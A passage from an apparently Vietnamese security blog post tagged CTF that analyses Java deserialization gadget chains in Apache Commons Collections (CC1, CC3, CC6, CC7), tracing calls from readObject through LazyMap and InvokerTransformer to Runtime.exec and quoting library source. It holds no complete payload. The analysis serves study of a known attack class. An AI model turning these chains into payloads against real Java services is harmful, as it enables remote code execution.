<pre><code>import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import java.lang.reflect.Method;

public class RCEExample {
    public static void main(String[] args) throws Exception {
        // Giả lập đối tượng TemplatesImpl đã bị chèn mã XSLT độc hại
        TemplatesImpl templates = new TemplatesImpl();
        
        // Reflection gọi phương thức nào đó có tham số (giả sử có)
        Method method = TemplatesImpl.class.getDeclaredMethod(&quot;someMethodWithArgs&quot;, String.class, int.class);
        method.setAccessible(true);

        // Thực thi với tham số
        method.invoke(templates, &quot;arg1&quot;, 123);  // Truyền vào tham số giả định
    }
}
</code></pre><h2 id="common-colecttion-1">common colecttion 1</h2>
<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java">	<span class="n">Gadget</span> <span class="n">chain</span><span class="o">:</span>
		<span class="n">ObjectInputStream</span><span class="o">.</span><span class="na">readObject</span><span class="o">()</span>
			<span class="n">AnnotationInvocationHandler</span><span class="o">.</span><span class="na">readObject</span><span class="o">()</span>
				<span class="n">Map</span><span class="o">(</span><span class="n">Proxy</span><span class="o">).</span><span class="na">entrySet</span><span class="o">()</span>
					<span class="n">AnnotationInvocationHandler</span><span class="o">.</span><span class="na">invoke</span><span class="o">()</span>
						<span class="n">LazyMap</span><span class="o">.</span><span class="na">get</span><span class="o">()</span>
							<span class="n">ChainedTransformer</span><span class="o">.</span><span class="na">transform</span><span class="o">()</span>
								<span class="n">ConstantTransformer</span><span class="o">.</span><span class="na">transform</span><span class="o">()</span>
								<span class="n">InvokerTransformer</span><span class="o">.</span><span class="na">transform</span><span class="o">()</span>
									<span class="n">Method</span><span class="o">.</span><span class="na">invoke</span><span class="o">()</span>
										<span class="n">Class</span><span class="o">.</span><span class="na">getMethod</span><span class="o">()</span>
								<span class="n">InvokerTransformer</span><span class="o">.</span><span class="na">transform</span><span class="o">()</span>
									<span class="n">Method</span><span class="o">.</span><span class="na">invoke</span><span class="o">()</span>
										<span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">()</span>
								<span class="n">InvokerTransformer</span><span class="o">.</span><span class="na">transform</span><span class="o">()</span>
									<span class="n">Method</span><span class="o">.</span><span class="na">invoke</span><span class="o">()</span>
										<span class="n">Runtime</span><span class="o">.</span><span class="na">exec</span><span class="o">()</span>
<span class="nl">
</span><span class="nl">	Requires:</span>
		<span class="n">commons</span><span class="o">-</span><span class="n">collections</span>
</code></pre></div><p>ở đây phần sink sẽ tương tự với CC5 nên ta sẽ không nói đoạn sau nữa bắt đầu đi vào phân tích source:</p>
<p>Đầu tiên vì class <code>AnnotationInvocationHandler</code> được sử dụng cho nên khi desesialize sẽ gọi đến method readObject của nó ta có thể thấy nó trong backtrace</p>
<p><img src="https://hackmd.io/_uploads/S1SexVN6A.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/BypVeN4aR.png" alt="image">
Sau khi vượt qua khối lệnh try catch thì sẽ khởi tạo một object var3 từ var2</p>
<p><img src="https://hackmd.io/_uploads/BJQ5lVV6A.png" alt="image"></p>
<p>Sau đó sẽ khởi tạo var4 qua method <code>.entrySet()</code> của class Map</p>
<p><img src="https://hackmd.io/_uploads/SJbEWEE60.png" alt="image">
Nó <code>Iterator var3 = this.memberValues.entrySet().iterator();</code> được khởi tạo như sau -&gt; nó gọi entrySet của thằng memberValues là class của LazyMap</p>
<p>-&gt; lúc này nó được coi như là 1 proxy gọi ngược trở lại method invoke</p>
<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="n">Object</span> <span class="nf">invoke</span><span class="o">(</span><span class="n">Object</span> <span class="n">var1</span><span class="o">,</span> <span class="n">Method</span> <span class="n">var2</span><span class="o">,</span> <span class="n">Object</span><span class="o">[]</span> <span class="n">var3</span><span class="o">)</span> <span class="o">{</span>
       <span class="n">String</span> <span class="n">var4</span> <span class="o">=</span> <span class="n">var2</span><span class="o">.</span><span class="na">getName</span><span class="o">();</span>
       <span class="n">Class</span><span class="o">[]</span> <span class="n">var5</span> <span class="o">=</span> <span class="n">var2</span><span class="o">.</span><span class="na">getParameterTypes</span><span class="o">();</span>
       <span class="k">if</span> <span class="o">(</span><span class="n">var4</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">&#34;equals&#34;</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="n">var5</span><span class="o">.</span><span class="na">length</span> <span class="o">==</span> <span class="n">1</span> <span class="o">&amp;&amp;</span> <span class="n">var5</span><span class="o">[</span><span class="n">0</span><span class="o">]</span> <span class="o">==</span> <span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">)</span> <span class="o">{</span>
           <span class="k">return</span> <span class="k">this</span><span class="o">.</span><span class="na">equalsImpl</span><span class="o">(</span><span class="n">var3</span><span class="o">[</span><span class="n">0</span><span class="o">]);</span>
       <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">var5</span><span class="o">.</span><span class="na">length</span> <span class="o">!=</span> <span class="n">0</span><span class="o">)</span> <span class="o">{</span>
           <span class="k">throw</span> <span class="k">new</span> <span class="n">AssertionError</span><span class="o">(</span><span class="s">&#34;Too many parameters for an annotation method&#34;</span><span class="o">);</span>
       <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
           <span class="k">switch</span> <span class="o">(</span><span class="n">var4</span><span class="o">)</span> <span class="o">{</span>
               <span class="k">case</span> <span class="s">&#34;toString&#34;</span><span class="o">:</span>
                   <span class="k">return</span> <span class="k">this</span><span class="o">.</span><span class="na">toStringImpl</span><span class="o">();</span>
               <span class="k">case</span> <span class="s">&#34;hashCode&#34;</span><span class="o">:</span>
                   <span class="k">return</span> <span class="k">this</span><span class="o">.</span><span class="na">hashCodeImpl</span><span class="o">();</span>
               <span class="k">case</span> <span class="s">&#34;annotationType&#34;</span><span class="o">:</span>
                   <span class="k">return</span> <span class="k">this</span><span class="o">.</span><span class="na">type</span><span class="o">;</span>
               <span class="k">default</span><span class="o">:</span>
                   <span class="n">Object</span> <span class="n">var6</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">memberValues</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">var4</span><span class="o">);</span>
                   <span class="k">if</span> <span class="o">(</span><span class="n">var6</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                       <span class="k">throw</span> <span class="k">new</span> <span class="n">IncompleteAnnotationException</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">type</span><span class="o">,</span> <span class="n">var4</span><span class="o">);</span>
                   <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">var6</span> <span class="k">instanceof</span> <span class="n">ExceptionProxy</span><span class="o">)</span> <span class="o">{</span>
                       <span class="k">throw</span> <span class="o">((</span><span class="n">ExceptionProxy</span><span class="o">)</span><span class="n">var6</span><span class="o">).</span><span class="na">generateException</span><span class="o">();</span>
                   <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
                       <span class="k">if</span> <span class="o">(</span><span class="n">var6</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">isArray</span><span class="o">()</span> <span class="o">&amp;&amp;</span> <span class="n">Array</span><span class="o">.</span><span class="na">getLength</span><span class="o">(</span><span class="n">var6</span><span class="o">)</span> <span class="o">!=</span> <span class="n">0</span><span class="o">)</span> <span class="o">{</span>
                           <span class="n">var6</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">cloneArray</span><span class="o">(</span><span class="n">var6</span><span class="o">);</span>
                       <span class="o">}</span>

                       <span class="k">return</span> <span class="n">var6</span><span class="o">;</span>
                   <span class="o">}</span>
           <span class="o">}</span>
       <span class="o">}</span>
   <span class="o">}</span>
</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"> <span class="n">Object</span> <span class="n">var6</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">memberValues</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">var4</span><span class="o">);</span> <span class="n">sẽ</span> <span class="n">gọi</span> <span class="n">đến</span> <span class="n">get</span> <span class="n">của</span> <span class="n">LazyMap</span>

<span class="kd">public</span> <span class="n">Object</span> <span class="nf">get</span><span class="o">(</span><span class="n">Object</span> <span class="n">key</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(!</span><span class="kd">super</span><span class="o">.</span><span class="na">map</span><span class="o">.</span><span class="na">containsKey</span><span class="o">(</span><span class="n">key</span><span class="o">))</span> <span class="o">{</span>
            <span class="n">Object</span> <span class="n">value</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">factory</span><span class="o">.</span><span class="na">transform</span><span class="o">(</span><span class="n">key</span><span class="o">);</span>
            <span class="kd">super</span><span class="o">.</span><span class="na">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">key</span><span class="o">,</span> <span class="n">value</span><span class="o">);</span>
            <span class="k">return</span> <span class="n">value</span><span class="o">;</span>
        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
            <span class="k">return</span> <span class="kd">super</span><span class="o">.</span><span class="na">map</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">key</span><span class="o">);</span>
        <span class="o">}</span>
    <span class="o">}</span>
</code></pre></div><p>Cái chain này có thể bạn thấy quen nếu đã đọc từ đầu bài này nó là gadget của CC5 và sinh của nó cũng y hệt nên các bạn từ đọc lại trên để tìm hiểu nhé.</p>
<h2 id="common-colection-3">common colection 3</h2>
<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="n">Gadget</span> <span class="n">chain</span><span class="o">:</span>
		<span class="n">ObjectInputStream</span><span class="o">.</span><span class="na">readObject</span><span class="o">()</span>
			<span class="n">AnnotationInvocationHandler</span><span class="o">.</span><span class="na">readObject</span><span class="o">()</span>
				<span class="n">Map</span><span class="o">(</span><span class="n">Proxy</span><span class="o">).</span><span class="na">entrySet</span><span class="o">()</span>
					<span class="n">AnnotationInvocationHandler</span><span class="o">.</span><span class="na">invoke</span><span class="o">()</span>
						<span class="n">LazyMap</span><span class="o">.</span><span class="na">get</span><span class="o">()</span>
							<span class="n">ChainedTransformer</span><span class="o">.</span><span class="na">transform</span><span class="o">()</span>
                               <span class="n">ConstantTransformer</span><span class="o">.</span><span class="na">transform</span><span class="o">()</span>
                                  <span class="n">InvokerTransformer</span><span class="o">.</span><span class="na">transform</span><span class="o">()</span>
                                    <span class="n">Method</span><span class="o">.</span><span class="na">invoke</span><span class="o">()</span>
                                     <span class="n">Class</span><span class="o">.</span><span class="na">getMethod</span><span class="o">()</span>
                                        <span class="n">InvokerTransformer</span><span class="o">.</span><span class="na">transform</span><span class="o">()</span>
                                           <span class="n">Method</span><span class="o">.</span><span class="na">invoke</span><span class="o">()</span>
                                              <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">()</span>
                                                  <span class="n">InvokerTransformer</span><span class="o">.</span><span class="na">transform</span><span class="o">()</span>
                                                      <span class="n">Method</span><span class="o">.</span><span class="na">invoke</span><span class="o">()</span>
                                                         <span class="n">Runtime</span><span class="o">.</span><span class="na">exec</span><span class="o">()</span>
                                 
</code></pre></div><p>Full chain của collection này nó lấy phần source và phần gadget của cc1 và phần sink của cc5 nên ta sẽ không phân tích lại nữa</p>
<h2 id="common-colection-6">common colection 6</h2>
<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="n">Gadget</span> <span class="n">chain</span><span class="o">:</span>
	    <span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">ObjectInputStream</span><span class="o">.</span><span class="na">readObject</span><span class="o">()</span>
            <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">HashSet</span><span class="o">.</span><span class="na">readObject</span><span class="o">()</span>
                <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">HashMap</span><span class="o">.</span><span class="na">put</span><span class="o">()</span>
                <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">HashMap</span><span class="o">.</span><span class="na">hash</span><span class="o">()</span>
                    <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">commons</span><span class="o">.</span><span class="na">collections</span><span class="o">.</span><span class="na">keyvalue</span><span class="o">.</span><span class="na">TiedMapEntry</span><span class="o">.</span><span class="na">hashCode</span><span class="o">()</span>
                    <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">commons</span><span class="o">.</span><span class="na">collections</span><span class="o">.</span><span class="na">keyvalue</span><span class="o">.</span><span class="na">TiedMapEntry</span><span class="o">.</span><span class="na">getValue</span><span class="o">()</span>
                        <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">commons</span><span class="o">.</span><span class="na">collections</span><span class="o">.</span><span class="na">map</span><span class="o">.</span><span class="na">LazyMap</span><span class="o">.</span><span class="na">get</span><span class="o">()</span>
                            <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">commons</span><span class="o">.</span><span class="na">collections</span><span class="o">.</span><span class="na">functors</span><span class="o">.</span><span class="na">ChainedTransformer</span><span class="o">.</span><span class="na">transform</span><span class="o">()</span>
                            <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">commons</span><span class="o">.</span><span class="na">collections</span><span class="o">.</span><span class="na">functors</span><span class="o">.</span><span class="na">InvokerTransformer</span><span class="o">.</span><span class="na">transform</span><span class="o">()</span>
                            <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">.</span><span class="na">Method</span><span class="o">.</span><span class="na">invoke</span><span class="o">()</span>
                                <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Runtime</span><span class="o">.</span><span class="na">exec</span><span class="o">()</span>

</code></pre></div><p>ở đây cc6 giống cc1 nhưng chỉ đổi phần sinh và phần 1 của gadget</p>
<h2 id="common-colection-7">common colection 7</h2>
<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="n">Payload</span> <span class="n">method</span> <span class="n">chain</span><span class="o">:</span>

    <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Hashtable</span><span class="o">.</span><span class="na">readObject</span>
    <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Hashtable</span><span class="o">.</span><span class="na">reconstitutionPut</span>
    <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">commons</span><span class="o">.</span><span class="na">collections</span><span class="o">.</span><span class="na">map</span><span class="o">.</span><span class="na">AbstractMapDecorator</span><span class="o">.</span><span class="na">equals</span>
    <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">AbstractMap</span><span class="o">.</span><span class="na">equals</span>
    <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">commons</span><span class="o">.</span><span class="na">collections</span><span class="o">.</span><span class="na">map</span><span class="o">.</span><span class="na">LazyMap</span><span class="o">.</span><span class="na">get</span>
    <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">commons</span><span class="o">.</span><span class="na">collections</span><span class="o">.</span><span class="na">functors</span><span class="o">.</span><span class="na">ChainedTransformer</span><span class="o">.</span><span class="na">transform</span>
    <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">commons</span><span class="o">.</span><span class="na">collections</span><span class="o">.</span><span class="na">functors</span><span class="o">.</span><span class="na">InvokerTransformer</span><span class="o">.</span><span class="na">transform</span>
    <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">.</span><span class="na">Method</span><span class="o">.</span><span class="na">invoke</span>
    <span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">.</span><span class="na">DelegatingMethodAccessorImpl</span><span class="o">.</span><span class="na">invoke</span>
    <span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">.</span><span class="na">NativeMethodAccessorImpl</span><span class="o">.</span><span class="na">invoke</span>
    <span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">.</span><span class="na">NativeMethodAccessorImpl</span><span class="o">.</span><span class="na">invoke0</span>
    <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Runtime</span><span class="o">.</span><span class="na">exec</span>
</code></pre></div><h2 id="common-colection-4">common colection 4</h2>
<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="cm">/*
</span><span class="cm"> * Variation on CommonsCollections2 that uses InstantiateTransformer instead of
</span><span class="cm"> * InvokerTransformer.
</span><span class="cm"> */</span>
</code></pre></div>

        
          <div class="blog-tags">
            
              
              <a href="https://l3mnt2010.github.io/tags/ctf/">CTF</a>&nbsp;
            
              
              <a href="https://l3mnt2010.github.io/tags/vietnamese/">Vietnamese</a>&nbsp;
            
          </div>
        

        

        
      </article>

      
        <ul class="pager blog-pager">
          
            <li class="previous">
              <a href="https://l3mnt2010.github.io/liferay-pentest/" data-toggle="tooltip" data-placement="top" title="Liferay Pentest">&larr; Previous Post</a>
            </li>
          
          
            <li class="next">
              <a href="https://l3mnt2010.github.io/insecure-deserialization-lab/" data-toggle="tooltip" data-placement="top" title="Insecure deserialization lab">Next Post &rarr;</a>
            </li>
          
        </ul>
      


      

    </div>
  </div>
</div>

      <footer>
  <div class="container">
    
    <div class="row">
      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
        <ul class="list-inline text-center footer-links">
          
          
        </ul>
        <p class="credits copyright text-muted">
          

          &nbsp;&bull;&nbsp;&copy;
          
            0001
          

          
            &nbsp;&bull;&nbsp;
            <a href="https://l3mnt2010.github.io/">&gt; root@l3mnt2010:~# ./exploit.py</a>
          
        </p>
        
        <p class="credits theme-by text-muted">
          <a href="https://gohugo.io">Hugo v0.83.1</a> powered &nbsp;&bull;&nbsp; Theme <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a> adapted from <a href="https://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a>
          
        </p>
      </div>
    </div>
  </div>
</footer><script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/katex.min.js" integrity="sha384-G0zcxDFp5LWZtDuRMnBkk3EphCK1lhEf4UEyEM693ka574TZGwo4IWwS6QLzM/2t" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/contrib/auto-render.min.js" integrity="sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script>
<script src="https://code.jquery.com/jquery-3.7.0.slim.min.js" integrity="sha384-w5y/xIeYixWvfM+A1cEbmHPURnvyqmVg5eVENruEdDjcyRLUSNej7512JQGspFUr" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@3.4.1/dist/js/bootstrap.min.js" integrity="sha384-aJ21OjlMXNL5UyIl/XNwTMqvzeRMZH2w8c5cRVpzpU8Y5bApTppSuUkhZXN0VxHd" crossorigin="anonymous"></script>

<script src="https://l3mnt2010.github.io/js/main.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q" crossorigin="anonymous"></script><script src="https://l3mnt2010.github.io/js/load-photoswipe.js"></script>










    
  </body>
</html>

